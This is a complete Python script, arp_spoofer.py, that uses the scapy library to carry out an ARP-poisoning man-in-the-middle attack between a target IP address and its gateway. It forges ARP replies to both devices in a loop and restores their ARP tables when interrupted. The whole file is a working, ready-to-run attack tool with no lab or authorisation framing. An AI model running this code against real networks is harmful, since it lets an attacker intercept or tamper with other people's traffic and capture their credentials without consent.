#! /usr/bin/env python
# arp_spoofer.py - ARP spoofer that performs a man-in-the-middle attack through disguise between chosen two devices.
# Compatibility: Python 3.x

import time
import scapy.all as scapy
import argparse


def get_arguments():
    parser = argparse.ArgumentParser(description="Performs a man-in-the-middle attack between two given IP addresses.")
    parser.add_argument(dest="target", help="target address of spoofed device")
    parser.add_argument("-g", "--gateway", dest="gateway", help="default gateway for the target device")
    arguments = parser.parse_args()

    if arguments.target is None:
        parser.error("[-] please specify a target IP address, use --help for more information")
    if arguments.gateway is None:
        # TODO: Add gateway based on a search on LAN and choose the default gateway of user's device.
        address = arguments.target.split(".")
        address[3] = "1"
        arguments.gateway = ".".join(address)
        print(f"[-] Gateway address was not specified. Using default address ({arguments.gateway})")

    return arguments


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast_frame / arp_request
    answered = scapy.srp(arp_packet, timeout=1, verbose=False)[0]
    try:
        return answered[0][1].hwsrc
    except IndexError:
        print(f"[-] Error. Could not get a response over the network. "
              f"The IP address might be invalid or there is a problem with your connection. "
              f"The program has been stopped.")
        exit()


def spoof(target_ip, gateway_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=gateway_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip),
                       psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=False)


def perform_spoofing(target_ip, gateway_ip):
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"[+] Sending 2 packets regularly... Total packets sent: {sent_packets_count}", end="\r")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Execution aborted. Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)


args = get_arguments()
target, gateway = args.target, args.gateway
perform_spoofing(target, gateway)
